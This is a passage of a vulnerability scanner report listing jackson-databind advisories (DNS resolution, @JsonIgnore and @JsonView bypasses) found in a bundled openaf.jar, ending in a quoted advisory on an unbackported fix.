+                        │      ├ Title           : jackson-databind: jackson-databind: Information Disclosure
+                        │      │                   via Eager DNS Resolution 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.0.0 until 2.18.8, 2.21.4, and 3.1.4,
+                        │      │                   JDKFromStringDeserializer constructed InetSocketAddress with
+                        │      │                    new InetSocketAddress(host, port), which performs eager DNS
+                        │      │                    name resolution for hostname inputs at deserialization
+                        │      │                   time. An application that binds untrusted JSON into a type
+                        │      │                   containing an InetSocketAddress field issues an
+                        │      │                   attacker-chosen DNS query during readValue, before any
+                        │      │                   application-level validation or connect logic. The fix uses
+                        │      │                   InetSocketAddress.createUnresolved(host, port), deferring
+                        │      │                   DNS to an explicit connect. This vulnerability is fixed in
+                        │      │                   2.18.8, 2.21.4, and 3.1.4. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ─ [0]: CWE-918 
+                        │      ├ VendorSeverity   ╭ amazon: 3 
+                        │      │                  ├ ghsa  : 2 
+                        │      │                  ╰ redhat: 2 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
+                        │      │                  │        │           /A:N 
+                        │      │                  │        ╰ V3Score : 5.3 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 5.3 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54514 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/1
+                        │      │                  │      f5a1037b1e9e05920e755cb35f198bcd46667e4 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5951 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                  │      /advisories/GHSA-hgj6-7826-r7m5 
+                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-54514 
+                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-54514 
+                        │      ├ PublishedDate   : 2026-06-23T21:17:02.467Z 
+                        │      ╰ LastModifiedDate: 2026-06-27T20:55:09.61Z 
+                        ├ [4]  ╭ VulnerabilityID : CVE-2026-54515 
+                        │      ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:89b51cb6dc14e3c4f8dedf2b77a7573b36899313783809dd21388
+                        │      │                   8f44c493eab 
+                        │      ├ Title           : jackson-databind: jackson-databind: Ignored properties can
+                        │      │                   be unexpectedly modified 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
+                        │      │                   BeanDeserializerBase.createContextual(), per-property
+                        │      │                   @JsonIgnoreProperties exclusions are applied by
+                        │      │                   _handleByNameInclusion(), producing a contextual
+                        │      │                   deserializer whose BeanPropertyMap has the ignored
+                        │      │                   properties removed. The subsequent per-property
+                        │      │                   case-insensitivity block (triggered by
+                        │      │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
+                        │      │                   from this._beanProperties (the original, unfiltered map)
+                        │      │                   instead of contextual._beanProperties, then overwrites the
+                        │      │                   filtered map — restoring every property
+                        │      │                   _handleByNameInclusion had just removed. The ignored
+                        │      │                   property becomes writable again. This vulnerability is fixed
+                        │      │                    in 2.18.9, 2.21.5, and 3.1.4. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ─ [0]: CWE-915 
+                        │      ├ VendorSeverity   ╭ amazon: 3 
+                        │      │                  ├ ghsa  : 2 
+                        │      │                  ╰ redhat: 2 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
+                        │      │                  │        │           /A:N 
+                        │      │                  │        ╰ V3Score : 5.3 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 5.3 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0
+                        │      │                  │      e1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5
+                        │      │                  │      962 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5
+                        │      │                  │      964 
+                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                  │      /advisories/GHSA-5jmj-h7xm-6q6v 
+                        │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
+                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
+                        │      ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
+                        │      ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
+                        ├ [5]  ╭ VulnerabilityID : CVE-2026-54516 
+                        │      ├ VendorIDs        ─ [0]: GHSA-9fxm-vc8v-hj55 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.21.4, 3.1.4 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54516 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:8c2ff7109220cea4e0816237276fcc2cb6f1d1e3799057f4c4d0a
+                        │      │                   25f907a51ef 
+                        │      ├ Title           : jackson-databind: jackson-databind: Security bypass due to
+                        │      │                   improper handling of renamed properties 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4,
+                        │      │                   POJOPropertiesCollector._renameProperties() allows a
+                        │      │                   property with @JsonProperty("renamed") on the getter and
+                        │      │                   @JsonIgnore on the setter to be renamed rather than dropped.
+                        │      │                    With MapperFeature.INFER_PROPERTY_MUTATORS enabled
+                        │      │                   (default), the private backing field is retained; during
+                        │      │                   deserialization BeanDeserializerFactory.addBeanProps() sees
+                        │      │                   hasField()==true, builds a FieldProperty, and makes the
+                        │      │                   backing field writable. An attacker supplying the renamed
+                        │      │                   JSON key writes the backing field directly, bypassing the
+                        │      │                   @JsonIgnore on the setter. This vulnerability is fixed in
+                        │      │                   3.1.4. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ─ [0]: CWE-915 
+                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+                        │      │                  ╰ redhat: 2 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
+                        │      │                  │        │           /A:N 
+                        │      │                  │        ╰ V3Score : 5.3 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 5.3 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54516 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/c
+                        │      │                  │      3d56dd25d52319828147c5b9aeabf2d485c250a 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/e
+                        │      │                  │      88cb17006b6af4883b973058f0bb6486e5074af 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5967 
+                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5968 
+                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                  │      /advisories/GHSA-9fxm-vc8v-hj55 
+                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54516 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54516 
+                        │      ├ PublishedDate   : 2026-06-23T21:17:02.723Z 
+                        │      ╰ LastModifiedDate: 2026-06-27T20:52:12.103Z 
+                        ├ [6]  ╭ VulnerabilityID : CVE-2026-54517 
+                        │      ├ VendorIDs        ─ [0]: GHSA-5hh8-q8hv-fr38 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.21.4, 3.1.4 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54517 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:a9efc7b66b15ffab54188d8ce09ca12cd118a2d4019490e68fb74
+                        │      │                   2be5c9e925e 
+                        │      ├ Title           : jackson-databind: jackson-databind: Information disclosure
+                        │      │                   via improper JsonView filter application 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4, in
+                        │      │                   BeanDeserializer._deserializeUsingPropertyBased, the
+                        │      │                   active-view (@JsonView) filter was applied only to creator
+                        │      │                   properties; the regular property-buffering branch performed
+                        │      │                   no prop.visibleInView(activeView) check. A change making
+                        │      │                   SetterlessProperty.isMerging() return true routed setterless
+                        │      │                    Collection/Map properties through this unguarded path, so a
+                        │      │                    setterless collection annotated with a restricted @JsonView
+                        │      │                    is populated from attacker JSON even when the active view
+                        │      │                   excludes it. This vulnerability is fixed in 2.21.4 and
+                        │      │                   3.1.4. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ─ [0]: CWE-863 
+                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+                        │      │                  ╰ redhat: 2 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
+                        │      │                  │        │           /A:N 
+                        │      │                  │        ╰ V3Score : 5.3 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 5.3 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54517 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/5
+                        │      │                  │      bf23edb4221f7dd2ec8e71ff6d26c61640f261d 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/9
+                        │      │                  │      4c5d215b3af1505098c686405d9641f041a9962 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5969 
+                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5970 
+                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                  │      /advisories/GHSA-5hh8-q8hv-fr38 
+                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54517 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54517 
+                        │      ├ PublishedDate   : 2026-06-23T21:17:02.853Z 
+                        │      ╰ LastModifiedDate: 2026-06-27T20:51:09.987Z 
+                        ├ [7]  ╭ VulnerabilityID : CVE-2026-54518 
+                        │      ├ VendorIDs        ─ [0]: GHSA-rcqc-6cw3-h962 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.21.4 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54518 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:b632916ae0a64bc024e3a193ec1b247e856d56347c4bfbcbbffdc
+                        │      │                   e40b2d46973 
+                        │      ├ Title           : jackson-databind: jackson-databind: Information disclosure
+                        │      │                   and data manipulation via view-based access control bypass[
+                        │      │                   m 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4,
+                        │      │                   UnwrappedPropertyHandler.processUnwrappedCreatorProperties()
+                        │      │                    replays buffered JSON into creator parameters but never
+                        │      │                   consults prop.visibleInView(activeView). The normal
+                        │      │                   property-based creator path gates creator properties on the
+                        │      │                   active view, but this unwrapped-creator replay path bypasses
+                        │      │                    that check, so a constructor parameter annotated with both
+                        │      │                   @JsonView(AdminView.class) and @JsonUnwrapped is populated
+                        │      │                   from attacker JSON even when a more restrictive view is
+                        │      │                   active. This vulnerability is fixed in 2.21.4 and 3.1.4. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ─ [0]: CWE-863 
+                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+                        │      │                  ╰ redhat: 2 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
+                        │      │                  │        │           /A:N 
+                        │      │                  │        ╰ V3Score : 6.5 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 6.5 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54518 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/7
+                        │      │                  │      21fa07ebbd4aab4a659a1a68940878315c3e341 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/d
+                        │      │                  │      633bc038f200c1397c07f1a2b46f58e72c91eea 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5971 
+                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5973 
+                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                  │      /advisories/GHSA-rcqc-6cw3-h962 
+                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54518 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54518 
+                        │      ├ PublishedDate   : 2026-06-23T22:16:32.073Z 
+                        │      ╰ LastModifiedDate: 2026-06-27T20:49:30.977Z 
+                        ├ [8]  ╭ VulnerabilityID : CVE-2026-59888 
+                        │      ├ VendorIDs        ─ [0]: GHSA-3pjw-73gf-8qr5 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.18.8, 2.21.4 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59888 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:ad0c6456fda17f0d3c81a518563c725cdc66370615dc91a33b527
+                        │      │                   9e87d39feac 
+                        │      ├ Title           : jackson-databind: @JsonIgnore on a Record property is
+                        │      │                   bypassed with a PropertyNamingStrategy 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records
+                        │      │                   using a PropertyNamingStrategy can bypass @JsonIgnore
+                        │      │                   because POJOPropertiesCollector._removeUnwantedIgnorals()
+                        │      │                   records an ignored component under its original implicit
+                        │      │                   name before _renameUsing() applies the naming strategy,
+                        │      │                   allowing the renamed JSON key to be assigned to the Record
+                        │      │                   constructor parameter. This issue is fixed in versions
+                        │      │                   2.18.8, 2.21.4, and 3.1.4. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ─ [0]: CWE-915 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
+                        │      │                         ╰ V3Score : 6.5 
+                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/b
+                        │      │                  │      aa2cdf5ca2b2717fbb88d91955d69d8651df3e4 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/c
+                        │      │                  │      7c678360624da5bc7eed2152789fa522880db9d 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5974 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                  │      /advisories/GHSA-3pjw-73gf-8qr5 
+                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59888 
+                        │      ├ PublishedDate   : 2026-07-14T17:17:15.137Z 
+                        │      ╰ LastModifiedDate: 2026-07-15T20:18:23.677Z 
+                        ├ [9]  ╭ VulnerabilityID : CVE-2026-59889 
+                        │      ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:a5aaf02e61d7a8244557e2820efb69bbd288d62addb002da72d47
+                        │      │                   7181cf25b71 
+                        │      ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped
+                        │      │                   container properties on deserialization 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1,
+                        │      │                   UnwrappedPropertyHandler.processUnwrapped() replays buffered
+                        │      │                    JSON for a @JsonUnwrapped property and calls
+                        │      │                   prop.deserializeAndSet() without a
+                        │      │                   prop.visibleInView(ctxt.getActiveView()) guard, allowing a
+                        │      │                   property annotated with both @JsonView and @JsonUnwrapped to
+                        │      │                    be written from attacker JSON under a less-privileged
+                        │      │                   active view. This issue is fixed in versions 2.18.9, 2.21.5,
+                        │      │                    2.22.1, 3.1.5, and 3.2.1. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ─ [0]: CWE-863 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
+                        │      │                         ╰ V3Score : 6.5 
+                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d
+                        │      │                  │      627a8a86fcb062429282f79f3f256f181ed2c7b 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6
+                        │      │                  │      060 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                  │      /advisories/GHSA-5gvw-p9qm-jgwh 
+                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
+                        │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
+                        │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
+                        ├ [10] ╭ VulnerabilityID : GHSA-mhm7-754m-9p8w 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.18.9, 2.21.5 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-mhm7-754m-9p8w 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:48568cf0018829ced39614830b3d05d3412b55a4324b51d2e4ed0
+                        │      │                   67d7c5dd91d 
+                        │      ├ Title           : jackson-databind: `@JsonView` bypass for creator properties
+                        │      │                   with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)` 
+                        │      ├ Description     : ## Summary
+                        │      │                   
+                        │      │                   In
+                        │      │                   `BeanDeserializer.deserializeUsingPropertyBasedWithExternalT
+                        │      │                   ypeId`, the active-view (`@JsonView`) filter was applied
+                        │      │                   only to the regular bean-property branch; the
+                        │      │                   creator-property branch performed no
+                        │      │                   `creatorProp.visibleInView(activeView)` check. A constructor
+                        │      │                    parameter annotated with both
+                        │      │                   `@JsonView(RestrictedView.class)` and
+                        │      │                   `@JsonTypeInfo(use=Id.NAME,
+                        │      │                     include=As.EXTERNAL_PROPERTY)` is populated from attacker
+                        │      │                   JSON even when a more restrictive view is active.
+                        │      │                     This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and
+                        │      │                   GHSA-rcqc (CVE-2026-54518) descriptions cover only the main
+                        │      │                   property-based path and the unwrapped-creator path
+                        │      │                   respectively; the external-type-id creator path was fixed on
+                        │      │                    the 3.x line via #6004 ("Extend #5969/#5971 fixes to ...
+                        │      │                   external-type-id case in regular BeanDeserializer", commit
+                        │      │                   7dc7a17, 2026-05-22) but
+                        │      │                     **the fix was never backported to 2.21 or 2.18**. Users on
+                        │      │                    2.21.4 and 2.18.8 who upgraded per the published advisories
+                        │      │                    remain vulnerable to the same `@JsonView` bypass technique
+                        │      │                   via a different code path.
+                        │      │                   ## Vulnerable Code Path
+                        │      │                   File:
+                        │      │                   `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`
+                        │      │                   Method: `deserializeUsingPropertyBasedWithExternalTypeId`
+                        │      │                   On 2.21.4 (and 2.18.8), the creator-property branch (around
+                        │      │                   line 1125-1158) checks `creatorProp.isInjectionOnly()` and
+                        │      │                   hands off to `ext.handlePropertyValue(...)` /
+                        │      │                   `buffer.assignParameter(...)` without ever consulting
+                        │      │                   `visibleInView(activeView)`:
+                        │      │                    ```java
+                        │      │                     if (creatorProp != null) {
+                        │      │                         // [databind#1381]: if useInput=FALSE, skip
+                        │      │                   deserialization from input
+                        │      │                         if (creatorProp.isInjectionOnly()) { ... }
+                        │      │                         // NO visibleInView(activeView) CHECK HERE
+                        │      │                         if (!ext.handlePropertyValue(p, ctxt, propName, null))
+                        │      │                    {
+                        │      │                             if (buffer.assignParameter(creatorProp, ...)) {
+                        │      │                   ... }
+                        │      │                         }
+                        │      │                         continue;
+                        │      │                     }
+                        │      │                   ```
+                        │      │                   On 3.1.4, the same branch contains the additional guard
+                        │      │                   (commit 7dc7a17):
+                        │      │                      if (creatorProp != null) {
+                        │      │                         // [databind#5971]: must honor active view here too
+                        │      │                         if ((activeView != null) &&
+                        │      │                   !creatorProp.visibleInView(activeView)) {
+                        │      │                             p.skipChildren();
+                        │      │                             continue;
+                        │      │                         ...
+                        │      │                   The 2.21 and 2.18 backport PRs (#6005 and #6003) only
+                        │      │                   backported the main-path fixes from #5969/#5971; the
+                        │      │                   external-type-id fix from #6004 was not backported. The
+                        │      │                   maintainer closed #6005
